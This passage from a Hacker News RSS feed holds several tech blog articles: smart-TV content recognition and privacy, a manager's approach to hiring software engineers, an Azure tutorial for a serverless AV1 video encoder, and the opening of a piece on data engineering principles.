<p>The bone of contention around ACR is due to the fact that audio and/or video are recorded, fingerprinted, and often stored for future use. Some devices might be able to generate the fingerprints on-device, but some might send the audio recordings to the cloud for further processing. </p>



<p>So what happens if your private conversations are in those recordings? Who is listening on the other end?</p>



<p>Samsung got into one of these sticky situations and had to clarify in a <a href="https://news.samsung.com/global/samsung-smart-tvs-do-not-monitor-living-room-conversations" target="_blank" rel="noopener">press release</a>. Their initial privacy policy stated –</p>



<p><em>“Please be aware that if your spoken words include personal or other sensitive information, that information will be among the data captured and transmitted to a third party through your use of Voice Recognition.”</em></p>



<p>This spooked a lot of people and Samsung had to backtrack and <a href="https://news.samsung.com/global/samsung-smart-tvs-do-not-monitor-living-room-conversations" target="_blank" rel="noopener">release a clarifying note</a> that said – </p>



<p><em>If you enable Voice Recognition, you can interact with your Smart TV using your voice. To provide you the Voice Recognition feature,&nbsp;some interactive voice commands may be transmitted (along with information about your device, including device identifiers) to a third-party service provider (currently, Nuance Communications, Inc.) that converts your interactive voice commands to text and to the extent necessary to provide the Voice Recognition features to you. In addition, Samsung may collect and your device may capture voice commands and associated texts so that we can provide you with Voice Recognition features and evaluate and improve the features. Samsung will collect your interactive voice commands only when you make a specific search request to the Smart TV by clicking the activation button either on the remote control or on your screen and speaking into the microphone on the remote control.</em></p>



<p>And, please don’t think that I am picking on Samsung. Another TV manufacturer, Vizio was fined by the FTC for not being forthright with its data-tracking policies. (<a href="https://www.ftc.gov/news-events/press-releases/2017/02/vizio-pay-22-million-ftc-state-new-jersey-settle-charges-it" target="_blank" rel="noopener">link to the notice on the FTC website</a>). </p>



<p>And, here’s an interesting <a href="https://www.consumerreports.org/privacy/how-to-turn-off-smart-tv-snooping-features/" target="_blank" rel="noopener">article from consumerreports.org</a> on how to turn off “snooping” features on Android TVs,&nbsp;Amazon Fire TV Edition,&nbsp;LG,&nbsp;Roku,&nbsp;Samsung,&nbsp;Sony, and&nbsp;Vizio.</p>



<p>All of this constitutes a weird situation, I …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ottverse.com/acr-automatic-content-recognition-how-does-it-work/">https://ottverse.com/acr-automatic-content-recognition-how-does-it-work/</a></em></p>]]>
            </description>
            <link>https://ottverse.com/acr-automatic-content-recognition-how-does-it-work/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25206054</guid>
            <pubDate>Wed, 25 Nov 2020 04:30:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Great software engineers are never actively looking for a job on job boards]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25205830">thread link</a>) | @karlhughes
<br/>
November 24, 2020 | https://www.karllhughes.com/posts/hiring-process | <a href="https://web.archive.org/web/*/https://www.karllhughes.com/posts/hiring-process">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
<article>
<div>
<p><img src="https://www.karllhughes.com/assets/img/hiring.png" alt="Recruiting and Hiring Software Engineers">
</p> 

<p>
2020, Nov 13&nbsp;&nbsp;&nbsp;—&nbsp;
13 minute read
</p>
<section id="mc_embed_signup">

</section>
<p>When I took my first real management role as <a href="https://www.karllhughes.com/posts/packback-engineering">Packback’s Head of Engineering back in 2015</a>, I inherited a great team of engineers who were hired before my promotion. Later that year, when the time came for me to do some of my own hiring, I had to quickly adopt a process for finding and onboarding new software engineers.</p>
<p>I started with the framework my predecessor used and brought in some heavy influences from <em><a href="https://www.karllhughes.com/posts/peopleware">Peopleware</a></em> and Josh Tyler’s <em><a href="https://amzn.to/1XQAfT7">Building Great Software Engineering Teams</a></em>. Over the years, I’ve refined my hiring process - mostly through trial and error - to come up with the iteration described here.</p>
<p>My approach is a little unconventional, but I hope it inspires you to think outside the box. This is going to be a long read, so I’ve broken it down into five sections:</p>
<ol>
<li><a href="#the-problem-with-hiring-software-engineers">The Problem with Hiring</a></li>
<li><a href="#skills-i-look-for-in-software-engineers">Skills I Look For</a></li>
<li><a href="#how-i-find-software-engineers">How I Find Candidates</a></li>
<li><a href="#how-i-hire-software-engineers">How I Hire Engineers</a></li>
<li><a href="#mistakes-ive-made-when-hiring-software-engineers">The Mistakes I’ve Made</a></li>
</ol>
<p><em>Note: If you’re looking for some books to help you on your journey as a software engineering manager, <a href="https://www.karllhughes.com/posts/reading-for-engineering-managers">here are some of my favorites</a>.</em></p>
<h2 id="the-problem-with-hiring-software-engineers">The Problem with Hiring Software Engineers</h2>
<p>Any <a href="https://www.karllhughes.com/posts/engineering-manager">engineering manager</a> who’s hired people in the past will tell you that it’s hard.</p>
<p>There are lots of constraints, no way to fairly compare two candidates, and suitable candidates for one team may be horrible for another. Because it’s so hard, the process has evolved to favor people who think like the interviewers, who know someone at the company, or who perform well in high-pressure interviews. It leaves people with non-traditional backgrounds struggling, often works against diverse candidates, and is nothing like the day-to-day work that most engineers do.</p>
<p>For example, a typical interview may require a phone screen with a recruiter who tests for “soft skills.” Next, an engineering manager may screen for baseline technical skills, and then the candidate may be asked to complete an independent project or come into the office for a whiteboarding session. In either case, <strong>the interview is nothing like a typical day working as an engineer</strong> (although the “take-home” project may be the closest in some environments).</p>
<p>Soft skills are important, but “tell me about a time when…” questions favor people who are quick to make things up, and they <a href="https://www.forbes.com/sites/lizryan/2014/03/04/why-i-hate-behavioral-interviewing/#7229c954693c">don’t demonstrate real judgment or problem-solving skills</a>. It’s impossible to assess someone’s character in a 30-minute phone screen, so at best, you can weed people out who are completely unreliable or have poor verbal communication skills.</p>
<p>Similarly, it’s very hard to judge a person’s technical ability in all things during a 1-hour tech screening. The field of web development (and software engineering in general) is so vast that nobody is going to match your requirements perfectly. You can ask them what technologies they’re familiar with and see if they can have a coherent conversation about technical topics, but you probably can’t bump up against the edges of all of their knowledge, especially if it doesn’t overlap with your own.</p>
<p>Finally, I’ve never done whiteboarding or live coding sessions with candidates, but <a href="https://theoutline.com/post/1166/programmers-are-confessing-their-coding-sins-to-protest-a-broken-job-interview-process">a lot of people really hate them</a>, and I think there’s a good reason for that. In the real world, programmers pushed in front of an audience to solve a problem with an obscure algorithm, no time for independent research, and no access to resources. I would never do this job if that were my day-to-day.</p>
<p>Testing programmers at something they don’t need to be good at and expecting to learn something about how they would work at your company is delusional. These kinds of interviews only serve to make the hiring team feel superior and ensure better outcomes for engineers with traditional CS backgrounds.</p>
<h2 id="skills-i-look-for-in-software-engineers">Skills I Look for in Software Engineers</h2>
<p><img src="https://i.imgur.com/FfOzjCZ.jpg" alt="Software Engineering Skills"></p>
<p>In an effort to redesign our hiring process around the skills that actually matter in software engineering, I took the problem down to <a href="https://fpt.guide/">first principles</a>. What skills do I need in a team of software engineers?</p>
<h3 id="initiative">Initiative</h3>
<p>I have never liked micromanaging people. I remember being a team lead at a restaurant in college and getting irrationally annoyed with people who would stand around while customers were lining up at the register. “Go, take an order or something!”</p>
<p>I digress.</p>
<p>Most software engineers who are looking for a job have a certain level of initiative, but great software engineering candidates go the extra mile all the time. For example, I worked with a guy at Packback who had built a website and extremely popular Twitter account to follow the chatter on police scanners. He did all this to learn new things for fun.</p>
<p>Software engineers who take initiative don’t wait for the hiring manager to email them back, they ask about next steps, and they read about the company before they show up for an interview. It’s not really that hard, but it does take time, and very few candidates do it.</p>
<h3 id="reliability">Reliability</h3>
<p>Initiative is a start, but <a href="https://www.karllhughes.com/posts/hero-myth">I don’t want a hero</a>. I want to build a team of consistently reliable engineers who improve over time.</p>
<p>Candidates with a history of staying in jobs for a long time, strong references, and commitment to projects usually make it to the top of my list when hiring.</p>
<h3 id="competency">Competency</h3>
<p>When I was a new engineering manager, I over-indexed on technical skills. It’s easy to fall into the trap of grading engineers based purely on their technical knowledge (whole companies like <a href="https://www.toptal.com/">Toptal</a> and <a href="https://triplebyte.com/">Triplebyte</a> are built on this fallacy), but arcane trivia does not make a sound engineer.</p>
<p>I’ll talk more about how I gauge a candidate’s competency later in this post, but the key question I ask is, <strong>do I think this engineer can learn to solve the problems we are facing?</strong></p>
<p>It’s not about whether they know all the answers on day one, but instead, I look for curious people who are lifelong learners with a drive to improve themselves. If they have that, I’ll find a way to get them the information they need to succeed in this role.</p>
<h3 id="interest-in-the-mission">Interest in the Mission</h3>
<p>I used to call this “passion,” but after a <a href="https://www.listennotes.com/podcasts/exceptions-welcome/building-a-resilient-career-dea4tx69g32/">lively conversation on the Exceptions Welcome podcast</a> I decided to rebrand this skill.</p>
<p>Ultimately, I only want to hire software engineers who care about our industry, the problems we’re solving, and the method we’re using to get there. If we aren’t pointing in the same direction before they join, I don’t want to spend the first six weeks convincing them.</p>
<p>While I don’t want unquestioning loyalty or people who live at the office, I do think it’s important that software engineers are actually interested in the work they will be doing. It’ll make them happier, and that positivity rubs off on everyone.</p>
<h2 id="how-i-find-software-engineers">How I Find Software Engineers</h2>
<p><img src="https://i.imgur.com/bTlxNvy.jpg" alt="Finding Software Engineers"></p>
<p>I’ve used several methods for finding and recruiting software engineers over the years. While I don’t have a ton of data to back up these methods, here’s what I’ve found works for me.</p>
<h3 id="job-listings">Job Listings</h3>
<p>Job listings are the <em><a href="https://unbounce.com/landing-page-articles/what-is-a-landing-page/">landing page</a></em> for job hunters.</p>
<p>A compelling job listing should outline the tools and languages the candidate should know, the projects the candidate will work on, and as much information about day-to-day expectations as is reasonable. I try to make job listings interesting and creative, so I typically use a GitHub repository with lots of information about our team, our company, and the job interview process (<a href="https://github.com/thegraidenetwork/job-openings">here’s an example of the repo I set up for The Graide Network</a>).</p>
<p>Remember that you won’t just share this listing with candidates. You’ll also be emailing it out to everyone in your network, sharing it on social media, and linking to it from your website. It’s a public-facing document that should be good looking and functional.</p>
<h3 id="networking">Networking</h3>
<p>I’ve never paid money to promote a job listing, but I doubt it’s worth it, and here’s why:</p>
<p><strong>The best software engineers are never <em>actively</em> looking for a job on job boards.</strong></p>
<p>They’re locked away behind gatekeepers called “their network,” which includes former managers and coworkers, friends, and people who know them from professional organizations. They jump ship when someone they trust tells them about a great opportunity or when they decide to ask around. Senior software engineers often laugh about how many Linkedin messages we get from naive recruiters.</p>
<p>So, what’s the trick to building a network full of software engineers?</p>
<p>Time.</p>
<p>People are surprised when I tell them that <a href="https://www.karllhughes.com/posts/the-key-to-networking-keeping-in-touch">I spend 4-8 hours per week building and maintaining my network</a>, but the dividends on that investment have been enormous. Whenever I have a new job opening, I write up a job listing and start passing it around. I keep a huge list of people I’d like to work with someday, so I go through it and find an excuse to get lunch.</p>
<p>If you’re not actively building your network right now, start <a href="https://ctocraft.com/blog/how-to-use-writing-to-build-a-solid-talent-pipeline/">writing</a>, <a href="https://www.karllhughes.com/posts/speaking-guide">speaking</a>, and taking meetings with interesting people. It’s the best investment you can make in your career.</p>
<h3 id="cold-outreach">Cold Outreach</h3>
<p>Another unpopular recruiting tool for finding software engineers is cold outreach. I’ve found that it can work, but you have to be careful. It’s easy to come off as spammy or annoying.</p>
<p>Treat cold outreach as an excuse to grow your network rather than jumping straight to “the ask.” Reach out to people, ask them genuine questions; do some research on their background; get to know them. You’re just having a conversation, and eventually, you might slide in a mention that you’re keeping an eye out for software engineers.</p>
<p>End each call by asking if you can follow up in a few months and (shocker!) actually do it. I’ve met some outstanding people this way, even if we never ended up working together.</p>
<h3 id="recruiters">Recruiters</h3>
<p>Recruiters get a bad name in the software engineering world because they can be pretty annoying. I’ve had junior recruiters cold call me at work or send job requests to my company email. Not a good look.</p>
<p>On the flip side, there are a few well-networked and honest tech recruiters out there. Just be ready to pay big bucks as the best likely work on a <a href="https://theundercoverrecruiter.com/contingency-vs-retained-recruiters-what-difference/">retainer rather than contingency</a>.</p>
<p>Even if you do get a recruiter, you need to keep recruiting too. If your recruiter doesn’t have any luck, you don’t want all your leads to dry up with them.</p>
<h2 id="how-i-hire-software-engineers">H…</h2></div></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.karllhughes.com/posts/hiring-process">https://www.karllhughes.com/posts/hiring-process</a></em></p>]]>
            </description>
            <link>https://www.karllhughes.com/posts/hiring-process</link>
            <guid isPermaLink="false">hacker-news-small-sites-25205830</guid>
            <pubDate>Wed, 25 Nov 2020 03:42:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a scalable 'shot-based' serverless AV1 video encoder in Azure]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25205775">thread link</a>) | @mrfusion
<br/>
November 24, 2020 | https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/ | <a href="https://web.archive.org/web/*/https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>This is a 3-part blog covering how to build a scalable shot-based serverless video encoder in Azure. In Part 1, I explain what AV1 is and where we are in the video encoding space. In part 2, we create a logic app to upload and index the video. In part 3, we’ll need to split the video into its scenes and encode individual scenes. For reference, here are the links to all the parts:</p>
<ol>
<li><a href="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-1/">https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-1/</a></li>
<li><a href="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/">https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/</a></li>
<li><a href="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-3/">https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-3/</a></li>
</ol>
<h2 id="the-solution">The solution</h2>
<p>To implement this solution, we need an algorithm that splits the input video into shots. Fortunately for us, <a href="https://vi.microsoft.com/en-us/">Microsoft Video Indexer</a> supports this scenario. Before getting started we’ll setup Video Indexer in our subscription. For the rest of the steps, here’s a quick overview of what’s going to happen:</p>
<p><img src="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/media/architecture.png" alt="“shot-based” serverless distributed AV1 video encoder in Azure"></p>
<ol>
<li>User uploads an MP4 video file to Azure Blob Storage</li>
<li>Because of the Azure Event Grid integration with Azure Blob Storage, a file upload event triggers a notification</li>
<li>The event notification is consumed by the first Logic App. The first step in the Logic App is to upload the video to Microsoft Video Indexer service</li>
<li>Once the video is indexed, we retrieve the video insights and store it in the “insights” Azure File share</li>
<li>While the video indexing is happening, we also copy the video file from Azure Blob Storage to the “source” Azure File share where it can be accessed by container instances later</li>
<li>When the indexing is complete, an “Indexing complete” notification is sent to trigger the second Logic App</li>
<li>In the second Logic App, the first step is to retrieve the video insights saved earlier</li>
<li>Next, we use an Azure Function to parse the shots data and create our container instance definitions as well as shots encoding commands for each container instance</li>
<li>Now we can use the Logic App-Container Instance connector to create container instances based on container instance definitions defined in the last step</li>
<li>As the container instances finish their respective encoding jobs, they save the output video in the “shots” Azure File share</li>
<li>Next, we trigger another Azure Function to iterate over the output files and create a <a href="https://trac.ffmpeg.org/wiki/Concatenate#demuxer">ffmpeg concat file</a></li>
<li>Once we have a concat file, we create another container instance with ffmpeg installed to execute the concat file</li>
<li>The output of the preview container instance i.e. all the encoded shots files that are combined to one file is saved in the “output” Azure File share</li>
<li>The user can then download the encoded file from the “output” Azure File share</li>
</ol>
<h6 id="user-experience">User Experience</h6>
<p>While building this solution, I wanted to keep the user experience simple. Hence a user needs to take only these steps:</p>
<ol>
<li>Upload an MP4 video file to a specified Azure Blob Storage Account</li>
<li>Download the encoded file from the “output” Azure File share</li>
</ol>
<h2 id="implementation-details">Implementation Details</h2>
<h6 id="setup-microsoft-video-indexer">Setup Microsoft Video Indexer</h6>
<ol>
<li>
<p>Start by going to <a href="https://vi.microsoft.com/en-us/">https://vi.microsoft.com/en-us/</a> and logging in with your Azure account</p>
</li>
<li>
<p>Once logged in, click “Create new account”</p>
<p><img src="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/media/0-vi-account.png" alt="Azure Video indexer create account"></p>
</li>
<li>
<p>Once you’ve logged into your Azure subscription, fill in the details for the Video Indexer instance you’d like to create.</p>
<p><img src="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/media/0-vi-connect-azure.png" alt="Connect Azure Video Indexer to Azure subscription"></p>
</li>
<li>
<p>It can take a few minutes for the Video Indexer to connect to your subscription. Once that is done, copy the account id of your new account</p>
<p><img src="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/media/0-vi-account-id.png" alt="Azure Video Indexer account id"></p>
</li>
<li>
<p>Now login with your Azure subscription at <a href="https://api-portal.videoindexer.ai/developer">https://api-portal.videoindexer.ai/developer</a> and copy the Primary or Secondary key</p>
</li>
</ol>

<ol start="6">
<li>That’s it! Now Video Indexer instance is all setup in your subscription</li>
</ol>
<h6 id="blob-upload-events">Blob upload events</h6>
<ol>
<li>
<p>Create a storage account. I named mine <strong>“serverlessn codermedia”</strong></p>
</li>
<li>
<p>In the storage account, create a container called <strong>“media”</strong> in the <strong>“Blobs”</strong> section. This is where the user will upload an .MP4 video file.</p>
</li>
<li>
<p>In the <strong>“Files”</strong> section, add 4 new file shares</p>
<p><strong>a.</strong> <strong>insights</strong> – we’ll store the insights about indexed video here<br>
<strong>b.</strong> <strong>output</strong> – we’ll store the full encoded video here that the user can download<br>
<strong>c.</strong> <strong>shots</strong> – we’ll store the individual encoded shots video files here<br>
<strong>d.</strong> <strong>source</strong> – we’ll store the user uploaded video file here for access by the container instances<br></p>
<p><img src="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/media/storage-account-event-grid-subscription-1.8.png" alt="A screenshot of a cell phone Description automatically generated"></p>
</li>
<li>
<div><p>Once the storage account is created, click the <strong>“Events”</strong> section of the storage account. In the <strong>“Events”</strong> section, use the <strong>“When a new blob is uploaded”</strong> quick start logic app to get started.</p><p>
<img src="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/media/storage-account-event-grid-subscription.png" alt="A screenshot of a cell phone Description automatically generated"></p></div>
</li>
<li>
<p>Next screen shows the Azure Blob Storage and Azure Event Grid connections <br>
<img src="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/media/storage-account-event-grid-subscription-1.5.png" alt="A screenshot of a cell phone Description automatically generated"></p>
</li>
<li>
<p>First create the connection for the storage account you just created
<img src="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/media/storage-account-event-grid-subscription-1.6.png" alt="A screenshot of a cell phone Description automatically generated"></p>
</li>
<li>
<p>Next, sign into Azure Event Grid with your current Azure subscription. Once you’ve done these steps, you should see the following screen showing green status!</p>
<p><img src="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/media/storage-account-event-grid-subscription-1.7.png" alt="A screenshot of a cell phone Description automatically generated"></p>
</li>
<li>
<p>Hit continue and you should now land on the Logic Apps designer</p>
</li>
<li>
<p>In the <strong>“When a resource event occurs”</strong><br>
<strong>a.</strong> select <strong>Event Type</strong> Item of <code>Microsoft.Storage.BlobCreated</code><br>
<strong>b.</strong> Add two new parameters – <strong>“Suffix Filter”</strong> with value <strong>".mp4"</strong> and <strong>“Subscription Name”</strong> with value anything you want<br></p>
</li>
<li>
<p>In the <strong>“If true”</strong> section
g. Delete all steps except <strong>“Compose”</strong></p>
</li>
</ol>

<ol start="11">
<li>
<p>Your Logic App at this point should look like below</p>
<p><img src="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/media/storage-account-event-grid-subscription-2.png" alt="A screenshot of a social media post Description automatically generated"></p>
</li>
<li>
<p>Save the logic app with whatever name you choose. In this solution, I named it as <strong>“video-indexer-logic-app”</strong></p>
</li>
</ol>
<h6 id="upload-video-to-microsoft-video-indexer">Upload video to Microsoft Video Indexer</h6>
<ol>
<li>
<p>After the <strong>“Compose”</strong> action, add a <strong>“Create SAS URI by path”</strong> action</p>
<p><strong>a.</strong> For the <strong>“Blob path”</strong>, choose the <strong>“Outputs”</strong> from the previous Compose action. You will have to click <strong>“See more”</strong> to see the output from the Compose action.<br>
<strong>b.</strong> Make sure you’re connected to the same Azure Blob Storage connection we defined earlier <em>(storage-la-conn in this case)</em></p>
<p><img src="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/media/2-create-sas-uri.png" alt="A screenshot of a social media post Description automatically generated"></p>
</li>
<li>
<p>Now add a <strong>“Get Account Access Token”</strong> action for Video Indexer (V2) connector.</p>
<p><img src="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/media/3-vi-get-account-access-token.png" alt="A screenshot of a cell phone Description automatically generated"></p>
<p><strong>a.</strong> The first time you do this, you will need to enter the <strong>Video Indexer API Key</strong> we copied earlier and enter a name for this Logic App-Video Indexer connection<br>
<img src="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/media/4-vi-create-connection.png" alt="A screenshot of a cell phone Description automatically generated"><br>
<strong>b.</strong> Once the connection is created, select the <strong>location</strong> you deployed your Video Indexer instance to earlier.<br>
<strong>c.</strong> Select the <strong>account Id</strong> we saved earlier<br>
<strong>d.</strong> Select <strong>“Yes”</strong> for <strong>“Allow Edit”</strong><br></p>
<p><img src="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/media/5-vi-get-account-access-token-details.png" alt="A screenshot of a cell phone Description automatically generated"></p>
</li>
<li>
<p>Now add a <strong>“Upload video and index”</strong> step and fill in the following details as shows in the image.
<img src="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/media/6-vi-upload-video-index.png" alt="A screenshot of a social media post Description automatically generated"></p>
</li>
</ol>
<p>For the Video Name field you can choose any name or make it dynamic using the expression tab to enter split(triggerBody()?[‘subject’], ‘/')?[6]. This splits the input video Uri to just the file name that was uploaded
<img src="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/media/6.1-vi-upload-video-index.png" alt="A screenshot of a social media post Description automatically generated"></p>

<ol>
<li>
<p>Now we need to copy the source video file to the <strong>“source”</strong> Azure File share so that our encoding containers instances can access it. For that, add a <strong>“Create container group”</strong> action and configure it like shown below.</p>
<p>We’re using a small wget container that will download the video from the SAS Uri we generated earlier and then copy it to <strong>“source”</strong> Azure File Share. Note that we’re using a minimal docker image, therefore we’ll need to use “–no-check-certificate” with wget to download from HTTPS SAS Uri of Azure Blob Storage.</p>
<p>Note that I’m creating this container in a new resource group <strong>“encoding-containers-rg”</strong> to keep a dedicated resource group for creating container instances.</p>
<p><img src="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/media/7-create-container-group.png" alt="A screenshot of a cell phone Description automatically generated"></p>
<p>For the containers field, you can use the following JSON to configure easily</p>
<div><pre><code data-lang="json"><span>[</span>
    <span>{</span>
        <span>"name"</span><span>:</span> <span>&lt;select</span> <span>output</span> <span>Video</span> <span>Id</span> <span>of</span> <span>“Upload</span> <span>and</span> <span>index”</span> <span>step</span><span>,</span>
        <span>"properties"</span><span>:</span> <span>{</span>
            <span>"image"</span><span>:</span> <span>"inutano/wget"</span><span>,</span>
            <span>"resources"</span><span>:</span> <span>{</span>
                <span>"requests"</span><span>:</span> <span>{</span>
                    <span>"cpu"</span><span>:</span> <span>1</span><span>,</span>
                    <span>"memoryInGB"</span><span>:</span> <span>0.5</span>
                <span>}</span>
            <span>},</span>
            <span>"command"</span><span>:</span> <span>[</span>
                <span>"wget"</span><span>,</span>
                <span>"--no-check-certificate"</span><span>,</span>
                <span>"-O"</span><span>,</span>
                <span>"/aci/source/&lt; enter into expression tab split(triggerBody()?['subject'], '/')?[6] &gt;"</span><span>,</span>
                    <span>&lt;Insert</span> <span>Web</span> <span>Url</span> <span>i.e.</span> <span>SAS</span> <span>Uri</span> <span>we</span> <span>generated</span> <span>earlier&gt;</span>
            <span>],</span>
            <span>"volumeMounts"</span><span>:</span> <span>[</span>
                <span>{</span>
                    <span>"mountPath"</span><span>:</span> <span>"/aci/source/"</span><span>,</span>
                    <span>"name"</span><span>:</span> <span>"source"</span><span>,</span>
                    <span>"readOnly"</span><span>:</span> <span>false</span>
                <span>}</span>
            <span>]</span>
        <span>}</span>
    <span>}</span>
<span>]</span>
</code></pre></div>
</li>
<li>
<p>Next, add an <strong>“Until”</strong> action to check for the completion of the previous container instance. Before filling in the details of the <strong>“Until”</strong> action, add a <strong>“Delay”</strong> and <strong>“Get properties of a container group”</strong> action like below.</p>
<p><img src="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/media/8.1-until.png" alt="A screenshot of a computer Description automatically generated"></p>
<p>Once this is done, now you can fill in the details of the <strong>“Until”</strong> action like below. NOTE: there are a few different state variables that show up. Choose the one I highlighted in the image below. Also in the advanced mode make sure the value is following to make sure you’ve selected the correct variable</p>
<p><code>@equals(body('Get_properties_of_a_container_group')?['properties']?['instanceView']?['state'], 'Succeeded')</code></p>
<p><img src="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/media/8.2-until.png" alt="A screenshot of a computer Description automatically generated"></p>
<br>
</li>
<li>
<p>Now for some cleanup! Let’s add a <strong>“Delete container group”</strong> action</p>
<p><img src="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/media/9-delete-container.png" alt="A screenshot of a cell phone Description automatically generated"></p>
</li>
</ol>
<h2 id="first-logic-app-created">First logic app created!</h2>
<p>At the end of above steps, your first logic app <strong>“video-indexer-logic-app”</strong> should look like below. I chose to leave the <strong>“If false”</strong> condition empty. You can setup an email notification for example if you choose to do so.</p>

<p><img src="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/media/10-logic-app-1-complete.png" alt="A screenshot of a cell phone Description automatically generated"></p>
<h2 id="end-of-part-2">End of Part 2</h2>
<p>This is the end of Part 2. In Part 3, we’ll actually encode the shots and combine the shots into 1 video file.</p>
<ul>
<li><a href="https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-3/">https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-3/</a></li>
</ul>
<h2 id="av1-resources">AV1 resources</h2>
<ul>
<li><a href="https://www.singhkays.com/blog/av1-wiki-resources-tools/">AV1 Resource Central: Videos, Tools, Presentations, Comparisons, Research Papers, Encoders, Decoders</a></li>
<li><a href="https://www.singhkays.com/blog/its-time-replace-gifs-with-av1-video/">It’s time to replace GIFs with AV1 video!</a></li>
</ul>

<p>Reach out if you have any questions! Feel free to follow me on</p>
<ul>
<li>Twitter - <a href="https://twitter.com/singhkays">@singhkays</a></li>
<li>LinkedIn - <a href="https://www.linkedin.com/in/singhkays/">https://www.linkedin.com/in/singhkays/</a></li>
</ul>
</div></div>]]>
            </description>
            <link>https://www.singhkays.com/blog/azure-serverless-distributed-video-encoder-av1-part-2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25205775</guid>
            <pubDate>Wed, 25 Nov 2020 03:33:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[4 V's of Good Data Engineering]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25205610">thread link</a>) | @apex-consulting
<br/>
November 24, 2020 | https://theapex.io/4-vs-big-data | <a href="https://web.archive.org/web/*/https://theapex.io/4-vs-big-data">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                                    <p>When talking about scalable data engineering there are four broad categories of questions that we like to start with. I like to call these the four V’s of Good Data Engineering: Volume, Velocity, Variety and Veracity.</p>

<h3 id="overview">Overview</h3>
<ol>
  <li><a href="#volume">Volume</a>
    <ul>
      <li><a href="#current">Current</a></li>
      <li><a href="#desired">Desired</a></li>
      <li><a href="#anticipated">Anticipated</a></li>
    </ul>
  </li>
  <li><a href="#velocity">Velocity</a>
    <ul>
      <li><a href="#input">Input Velocity</a></li>
      <li><a href="#output">Output Velocity</a></li>
      <li><a href="#intra">Intra Velocity</a></li>
      <li><a href="#pressure">Pressure</a></li>
    </ul>
  </li>
  <li><a href="#variety">Variety</a>
    <ul>
      <li><a href="#flexibility">Flexibility</a></li>
      <li><a href="#discoverability">Discoverability</a></li>
      <li><a href="#useability">Useability</a></li>
    </ul>
  </li>
  <li><a href="#veracity">Veracity</a>
    <ul>
      <li><a href="#traceability">Traceability</a></li>
      <li><a href="#expl">Explainability</a></li>
      <li><a href="#expl">Auditability</a></li>
      <li><a href="#security">Security</a></li>
    </ul>
  </li>
</ol>


<p><img src="https://theapex.io/assets/images/volume.png" width="600"></p>
<p>Volume is simply a measure of how much data you wish to process. This is usually a discussion of gross numbers and timelines associated with them, and gives a rough idea of some architecture constraints and guidelines. For volume the discussion is a straightforward one about business goals and aspirations. Usually the discussion breaks down as follows:</p>
<h3 id="-current-volume"><a name="current"></a> Current Volume:</h3>
<p>What is the current volume of data that a particular data pipeline or system is processing. You can also discuss the current architecture and any bottlenecks it may be facing. When looking at current volume of data some considerations that may matter are:</p>
<ol>
  <li><strong><em>Volumes per access level</em></strong>: What volumes of data currently in terms of access patterns. In other words, there may be 10 PB worth of data, but 9 PB of that may be “cold data” or archive data and only 1 PB is regularly accessed or used for any analytics. Further than that it could be that only 1 TB is “hot data” or data that is frequently accessed. This will also impact how data estimates could be affected, for example archive data may be compressed or stored in columnar or analytical formats which would not give an accurate comparison to row based serial data.</li>
  <li><strong><em>Data Retention</em></strong> Companies may not be keeping all the data they wish to currently keep and have imposed retention policies which they may choose to remove if they have a more scalable data strategy in place. Data Retention can also be used to estimate the amount of data flowing through a system regardless of persistence for data processing purposes.</li>
